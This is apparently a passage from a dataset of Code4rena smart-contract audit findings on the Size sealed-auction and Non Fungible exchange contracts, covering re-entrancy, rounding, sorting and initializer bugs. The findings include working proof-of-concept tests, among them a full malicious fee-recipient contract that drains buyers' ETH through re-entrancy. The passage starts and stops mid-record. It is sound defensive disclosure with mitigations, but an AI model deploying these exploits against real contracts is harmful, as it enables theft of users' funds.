address[](1);         addrme[0] = address(this);         tax777Token = new TaxERC777(\"t7\", \"t7\", addrme);                  seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));         Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);          // just without adding more function to MockSeller         vm.startPrank(address(seller));         _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(\"ERC777TokensSender\"), address(callbackImpl));         tax777Token.approve(address(callbackImpl), type(uint256).max);         vm.stopPrank();         seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );         uint auction_balance = tax777Token.balanceOf(address(auction));         uint128 auction1_amount = get_auction_base_amount(1);         uint128 auction2_amount = get_auction_base_amount(2);         emit log_named_uint(\"auction balance\", auction_balance);         emit log_named_uint(\"auction 1 totalBaseAmount\", auction1_amount);         emit log_named_uint(\"auction 2 totalBaseAmount\", auction2_amount);         assertGt(auction1_amount+auction2_amount, auction_balance);     }      function get_auction_base_amount(uint id) private returns (uint128){         (, ,AuctionParameters memory para) = auction.idToAuction(id);         return para.totalBaseAmount;     } } ```  You should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24` ``` forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX ```  Test passed and print logs: ``` ... ...     \u251c\u2500 [4900] SizeSealed::idToAuction(1) [staticcall]     \u2502   \u2514\u2500 \u2190 (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     \u251c\u2500 [4900] SizeSealed::idToAuction(2) [staticcall]     \u2502   \u2514\u2500 \u2190 (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     \u251c\u2500 emit log_named_uint(key: auction balance, val: 10000000000000000000)     \u251c\u2500 emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)     \u251c\u2500 emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)     \u2514\u2500 \u2190 ()  Test result: ok. 1 passed; 0 failed; finished in 7.64s ```  ## Tools Used  foundry  ## Recommended Mitigation Steps check re-entrancy"}, {"title": "The sorting logic is not strict enough", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277   # Vulnerability details  ## Impact When the seller finalizes his auction, all bids are sorted according to the `quotePerBase` and it's calculated using the `FixedPointMathLib.mulDivDown()`.  And the earliest bid will be used first for the same `quotePerBase` but this ratio is not strict enough so that the worse bid might be filled than the better one.  As a result, the seller might receive fewer quote token than he wants.  ## Proof of Concept This is the test to show the scenario.  ```solidity     function testAuditWrongSorting() public {         // this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization         uint128 K = 1<<64;         baseToSell = K + 2;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(K+1, K, \"Worse bidder\");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(K+2, K+1, \"Better bidder\"); // This is the better bid because (K+1)/(K+2) > K/(K+1)          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 1; // the seller is smart enough to choose the correct order to (1, 0)         bidIndices[1] = 0;          vm.expectRevert(ISizeSealed.InvalidSorting.selector);         seller.finalize(bidIndices, K+2, K+1); // this reverts because of #273          // next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder         bidIndices[0] = 0;         bidIndices[1] = 1;         seller.finalize(bidIndices, K+1, K);          // at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder         assertEq(quoteToken.balanceOf(address(seller)), K);     } ```  This is the output of the test.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [PASS] testAuditWrongSorting() (gas: 984991)     Test result: ok. 1 passed; 0 failed; finished in 7.22ms ```  When it calculates the [quotePerBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269), they are same each other with `(base, quote) = (K+1, K) and (K+2, K+1) when K = 1<<64`.  So the seller can receive `K+1` of the quote token but he got `K`.  I think `K` is realistic enough with the 18 decimals token because K is around 18 * 1e18.  ## Tools Used Foundry  ## Recommended Mitigation Steps As we can see from the test, it's not strict enough to compare bidders using `quotePerBase`.  We can compare them by multiplying them like below.  $\\frac {quote1}{base1} >= \\frac{quote2}{base2} <=> quote1 * base2 >= quote2 * base1 $  So we can add 2 elements to `FinalizeData` struct and modify [this comparison](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277) like below.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;         uint128 previousQuote; //++++++++++++         uint128 previousBase; //+++++++++++     } ```  ```solidity     uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);     if (quotePerBase >= data.previousQuotePerBase) {         // If last bid was the same price, make sure we filled the earliest bid first         if (quotePerBase == data.previousQuotePerBase) {             uint256 currentMult = uint256(b.quoteAmount) * data.previousBase; //mult for current bid             uint256 previousMult = uint256(data.previousQuote) * baseAmount; //mult for the previous bid              if (currentMult > previousMult) { // current bid is better                 revert InvalidSorting();                 }              if (currentMult == previousMult && data.previousIndex > bidIndex) revert InvalidSorting();         } else {             revert InvalidSorting();         }     }      ...      data.previousBase = baseAmount;     data.previousQuote = b.quoteAmount; ```"}, {"title": "Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/94", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325   # Vulnerability details  ## Impact Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.  The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.  If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.  ## Proof of Concept After the auction was finalized, the seller receives the `filledQuote` amount of quote token using [data.filledBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).  ```solidity     // Calculate quote amount based on clearing price     uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); ```  But when the bidders withdraw the funds using `withdraw()`, they offer the quote token [using this formula](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).  ```solidity     // Refund unfilled quoteAmount on first withdraw     if (b.quoteAmount != 0) {         uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);         uint256 refundedQuote = b.quoteAmount - quoteBought;         b.quoteAmount = 0;          SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);     } ```  Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.  This is the test to show the scenario.  ```solidity     function testAuditBidderMoneyLock() public {         // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller         uint128 K = 1 ether;         baseToSell = 4*K;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, \"Honest bidder\");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, \"Honest bidder\");          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 0;         bidIndices[1] = 1;          seller.finalize(bidIndices, 2*K, 2*K+1);         emit log_string(\"Seller claimed\");         // seller claimed 4*K+2         assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);         // contract has K+1 quote token left         assertEq(quoteToken.balanceOf(address(auction)), K+1);          // bidder1 withdraws         bidder1.withdraw();         emit log_string(\"Bidder 1 withdrew\");         // contract has K quote token left         assertEq(quoteToken.balanceOf(address(auction)), K);         // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens         // but the protocol reverts because of insufficient quote tokens         bidder2.withdraw();         emit log_string(\"Bidder 2 withdrew\"); // will not happen     } ```  The test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)     Logs:     Seller claimed     Bidder 1 withdrew      Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms      Failing tests:     Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985) ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Currently, the `FinalizeData` struct contains the `filledBase` only and calculates the `filledQuote` using the clearing price.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;     } ```  I think we should add one more field `filledQuote` and update it during auction finalization.  And the seller can recieve the sum of `filledQuote` of all bidders to avoid the rounding issue.  Also, each bidder can pay the `filledQuote` of quote token and receive the `filledBase` of base token without calculating again using the clearing price."}, {"title": "Pool designed to be upgradeable but does not set owner, making it unupgradeable", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/186", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Pool.sol#L13   # Vulnerability details  ## Description  The docs state: \"*The pool allows user to predeposit ETH so that it can be used when a seller takes their bid. It uses an ERC1967 proxy pattern and only the exchange contract is permitted to make transfers.*\"  Pool is designed as an ERC1967 upgradeable proxy which handles balances of users in Not Fungible. Users may interact via deposit and withdraw with the pool, and use the funds in it to pay for orders in the Exchange.  Pool is declared like so: ``` contract Pool is IPool, OwnableUpgradeable, UUPSUpgradeable {  function _authorizeUpgrade(address) internal override onlyOwner {}  ... ```  Importantly, it has no constructor and no initializers. The issue is that when using upgradeable contracts, it is important to implement an initializer which will call the base contract's initializers in turn. See how this is done correctly in Exchange.sol:  ``` /* Constructor (for ERC1967) */ function initialize(     IExecutionDelegate _executionDelegate,     IPolicyManager _policyManager,     address _oracle,     uint _blockRange ) external initializer {     __Ownable_init();     isOpen = 1;    ... } ```  Since Pool skips the \\_\\_Ownable_init initialization call, this logic is skipped: ``` function __Ownable_init() internal onlyInitializing {     __Ownable_init_unchained(); } function __Ownable_init_unchained() internal onlyInitializing {     _transferOwnership(_msgSender()); } ```  Therefore, the contract owner stays zero initialized, and this means any use of onlyOwner will always revert.  The only use of onlyOwner in Pool is here: ``` function _authorizeUpgrade(address) internal override onlyOwner {} ```  The impact is that when the upgrade mechanism will check caller is authorized, it will revert. Therefore, the contract is unexpectedly unupgradeable. Whenever the EXCHANGE or SWAP address, or some functionality needs to be changed, it would not be possible.  ## Impact  The Pool contract is designed to be upgradeable but is actually not upgradeable  ## Proof of Concept  In the 'pool' test in execution.test.ts, add the following lines: ``` it('owner configured correctly', async () => {   expect(await pool.owner()).to.be.equal(admin.address); }); ```  It shows that the pool after deployment has owner as 0x0000...00  ## Tools Used  Manual audit, hardhat  ## Recommended Mitigation Steps  Implement an initializer for Pool similarly to the Exchange.sol contract."}, {"title": "Direct theft of buyers ETH funds.", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212 https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154   # Vulnerability details  ## Impact  Most severe issue:  **A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).**  Additional impacts that can be caused by these bugs: 1. Seller or Fee recipient can cause next in line executions to revert in `bulkExecute` (by altering `isInternal`, insufficient funds, etc..) 2. Seller or Fee recipient can call `_execute` externally  3. Seller or Fee recipient can set a caller `_remainingETH` to 0 (will not get refunded)  ## Proof of Concept Background: * The protocol added a `bulkExecute` function that allows multiple orders to execute. The implementation is implemented in a way that if an `_execute` of a single order reverts, it will not break additional or previous successful `_execute`s. It is therefore very important to track actual ETH used by the function.  * The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the `_returnDust` function and `setupExecution` modifier. This ensures that calls to `_execute` must be internal and have proper accounting of remainingETH.  * Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.  The new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.  There are three main bugs that can be exploited to steal the ETH: 1. Reentrancy is possible by feeRecipient as long as `_execute` is not called (`_execute` has a reentrancyGuard) 2. `bulkExecute` can be called with an empty parameter. This allows the caller to not enter `_execute` and call `_returnDust` 3. `_returnDust` sends the entire balance of the contract to the caller.  (Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)  There are two logical scenarios where the heist could originate from: 1. Malicious seller: The seller can set the fee recipient to a malicious contract. 2. Malicious fee recipient: fee recipient can steal the funds without the help of the seller.   Consider the scenario (#1) where feeRecipient rate 10% of token price 1 ETH: 1. Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice's (seller) sell order (lets assume first in line). 2. Bob calls `bulkExecute` with `4 ETH`. `1 ETH` for every order.  3. Alice's sell order gets executed. Fee  `0.1 ETH` is sent to feeRecipient (controlled by Alice). 4. feeRecipient *reenters* `bulkExecute` with *empty* array as parameter and `1 WEI` of data 5. `_returnDust` returns the balance of the contract to feeRecipient `3.9 ETH`. 6. feeRecipient sends `3.1 ETH` to seller (or any other beneficiary) 7. feeRecipient call `selfdestruct` opcode that transfers `0.9 ETH` to Exchange contract. This is in order to keep `_execute` from reverting when paying the seller. 8. `_execute` pays seller  `0.9 ETH`  9. Sellers balance is `4 ETH`.  10. The rest of the `_execute` calls by `bulkExecute` will get reverted because buyer cannot pay as his funds were stolen. 11. Buyers `3 ETH` funds stolen  ``` \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502 \u2502   Buyer   \u2502            \u2502 Exchange \u2502         \u2502 Fee Recipient \u2502    \u2502  Seller   \u2502 \u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518       \u2502                       \u2502                       \u2502                  \u2502       \u2502 bulkExecute(4 orders) \u2502                       \u2502                  \u2502       \u2502         4 ETH         \u2502                       \u2502                  \u2502       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                       \u2502                  \u2502       \u2502                       \u2502_execute sends 0.1 ETH \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502 bulkExecute(0 orders) \u2502                  \u2502       \u2502                       \u2502         1 WEI         \u2502                  \u2502       \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502    _retrunDust sends  \u2502                  \u2502       \u2502                       \u2502         3.9 ETH       \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502  Send 3.1 ETH    \u2502       \u2502                       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502       \u2502                       \u2502 Self destruct send    \u2502                  \u2502       \u2502                       \u2502         0.9 ETH       \u2502                  \u2502       \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u2502_execute sends 0.9 ETH \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502       \u2502                       \u2502                       \u2502                  \u2502       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 _execute revert\u2502                  \u2502       \u2502                       \u2502      \u2502     3 times    \u2502                  \u2502   \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510                   \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518                \u2502              \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510   \u25023 ETH  \u2502                   \u2502                       \u2502              \u25024 ETH  \u2502   \u2502Stolen \u2502                                                          \u2502Balance\u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 ```  Here is a possible implementation of the fee recipient contract: ``` contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;      constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);              // Now we received All of buyers funds.              // Send stolen ETH to seller minus the amount needed in order to keep execution.             address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');              // selfdestruct and send funds needed to Exchange (to not revert)             selfdestruct(payable(msg.sender));         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } } ```  Important to know: the exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:  ``` pragma solidity 0.8.17;  import { Exchange } from \"../Exchange.sol\"; import { Execution } from \"../lib/OrderStructs.sol\";  contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;          constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } } ```  In the POC we talk mostly about `bulkExecute` but `execute` of a single execution can steal the buyers excessive ETH. ### Technical walkthrough of scenario  Buyers can call `execute` or `bulkExecute` to start an execution of orders.   Both functions have a `setupExecution` modifier that stores the amount of ETH the caller has sent for the transactions:  `bulkExecute` in `Exchange.sol`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 ```     function bulkExecute(Execution[] calldata executions)         external         payable         whenOpen         setupExecution     { ```  `setupExecution`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L40 ```     modifier setupExecution() {         remainingETH = msg.value;         isInternal = true;         _;         remainingETH = 0;         isInternal = false;     } ```  `_execute` will be called to handle the buy and sell order. * The function has a reentracnyGuard.  * The function will check that the orders are signed correctly and that both orders match. * If everything is OK, `_executeFundsTransfer` will be called to transfer the buyers funds to the seller and fee recipient  `_executeFundsTransfer`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565 ```     function _executeFundsTransfer(         address seller,         address buyer,         address paymentToken,         Fee[] calldata fees,         uint256 price     ) internal {         if (msg.sender == buyer && paymentToken == address(0)) {             require(remainingETH >= price);             remainingETH -= price;         }          /* Take fee. */         uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);          /* Transfer remainder to seller. */         _transferTo(paymentToken, buyer, seller, receiveAmount);     } ```  Fees are calculated based on the rate set by the seller and send to the fee recipient in `_transferFees`.   When the fee recipient receives the funds. They can reenter the Exchange contract and drain the balance of contract.  This can be done through `bulkExecution`.  `bulkExecution` can be called with an empty array. If so, no `_execute` function will be called and therefore no reentrancyGuard will trigger. At the end of `bulkExecution`, `_returnDust` function is called to return excessive funds.  `bulkExecute`:  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168 ```     function bulkExecute(Execution[] calldata executions)         external         payable         whenOpen         setupExecution     {         /*         REFERENCE         uint256 executionsLength = executions.length;         for (uint8 i=0; i < executionsLength; i++) {             bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);             (bool success,) = address(this).delegatecall(data);         }         _returnDust(remainingETH);         */         uint256 executionsLength = executions.length;         for (uint8 i = 0; i < executionsLength; i++) { ```  `_returnDust`: https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212 ```     function _returnDust() private {         uint256 _remainingETH = remainingETH;         assembly {             if gt(_remainingETH, 0) {                 let callStatus := call(                     gas(),                     caller(),                     selfbalance(),                     0,                     0,                     0,                     0                 )             }         }     } ```  After the fee recipient drains the rest of the 4 ETH funds of the Exchange contract (the buyers funds). They need to transfer a portion back (0.9 ETH) to the Exchange contract in order for the `_executeFundsTransfer` to not revert and be able to send funds (0.9 ETH) to the seller. This can be done using the `selfdestruct` opcode  After that, the `_execute` function will continue and exit normally. `bulkExecute` will continue to the next order and call `_execute` which will revert.  Because `bulkExecute` delegatecalls `_execute` and continues even after revert, the function `bulkExecute` will complete its execution without any errors and all the buyers ETH funds will be lost and nothing will be refunded.  ### Hardhat POC:  add the following test to `execution.test.ts`: ``` describe.only('hack', async () => {       let executions: any[];       let value: BigNumber;       beforeEach(async () => {         await updateBalances();         const _executions = [];         value = BigNumber.from(0);         // deploy MockFeeReceipient         let contractFactory = await (hre as any).ethers.getContractFactory(           \"MockFeeReceipient\",           {},         );         let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);         await contractMockFeeReceipient.deployed();         //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut         tokenId += 1;         await mockERC721.mint(alice.address, tokenId);         sell = generateOrder(alice, {           side: Side.Sell,           tokenId,           paymentToken: ZERO_ADDRESS,           fees: [              {               rate: 1000,               recipient: contractMockFeeReceipient.address,             }           ],         });         buy = generateOrder(bob, {            side: Side.Buy,           tokenId,           paymentToken: ZERO_ADDRESS});         _executions.push({             sell: await sell.packNoOracleSig(),             buy: await buy.packNoSigs(),         });         // create 3 more executions         tokenId += 1;         for (let i = tokenId; i < tokenId + 3; i++) {           await mockERC721.mint(thirdParty.address, i);           const _sell = generateOrder(thirdParty, {             side: Side.Sell,             tokenId: i,             paymentToken: ZERO_ADDRESS,           });           const _buy = generateOrder(bob, {             side: Side.Buy,             tokenId: i,             paymentToken: ZERO_ADDRESS,           });           _executions.push({             sell: await _sell.packNoOracleSig(),             buy: await _buy.packNoSigs(),           });         }         executions = _executions;       });       it(\"steal funds\", async () => {         let aliceBalanceBefore = await alice.getBalance();         //price = 4 ETH         value = price.mul(4);         //call bulkExecute         tx = await waitForTx(           exchange.connect(bob).bulkExecute(executions, { value  }));         let aliceBalanceAfter = await alice.getBalance();         let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);         //check that alice received all 4 ETH         expect(aliceEarned).to.equal(value);       });     }); ```  Add the following contract to mocks folder: `MockFeeRecipient.sol`: ``` pragma solidity 0.8.17;  import { Exchange } from \"../Exchange.sol\"; import { Execution } from \"../lib/OrderStructs.sol\";  contract MockFeeReceipient {      bool lock;     address _seller;     uint256 _price;      constructor(address seller, uint256 price) {         _seller = seller;         _price = price;     }     receive() external payable {         Exchange ex = Exchange(msg.sender);         if(!lock){             lock = true;             // first entrance when receiving fee             uint256 feeAmount = msg.value;             // Create empty calldata for bulkExecute and call it             Execution[] memory executions = new Execution[](0);             bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);             address(ex).call{value: 1}(data);              // Now we received All of buyers funds.              // Send stolen ETH to seller minus the amount needed in order to keep execution.             address(_seller).call{value: address(this).balance - (_price - feeAmount)}('');              // selfdestruct and send funds needed to Exchange (to not revert)             selfdestruct(payable(msg.sender));         }         else{             // Second entrance after steeling balance             // We will get here after getting funds from reentrancy         }     } }  ```  Execute `yarn test` to see that test pass (Alice stole all 4 ETH)  ## Tools Used VS code, hardhat  ## Recommended Mitigation Steps 1. Put a reentrancyGuard on `execute` and `bulkExecute` functions 2. `_refundDust` return only _remainingETH 3. revert in `bulkExecute` if parameter array is empty. "}, {"title": "Yul `call` return value not checked", "html_url": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues/90", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-11-non-fungible-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212-L227   # Vulnerability details  ### Author: rotcivegaf  ### Impact  The Yul `call` return value on function `_returnDust` is not checked, which could leads to the `sender` lose funds  ### Proof of Concept  The caller of the functions `bulkExecute` and `execute` could be a contract who may not implement the `fallback` or `receive` functions or reject the `call`, when a call to it with value sent in the function `_returnDust`, it will revert, thus it would fail to receive the `dust` ether  Proof:   - A contract use `bulkExecute`  - One of the executions fails  - The `Exchange` contract send the `dust`(Exchange balance) back to the contract   - This one for any reason reject the call  - The `dust` stay in the `Exchange` contract  - In the next call of `bulkExecute` or `execute` the balance of the `Exchange` contract(including the old `dust`) will send to the 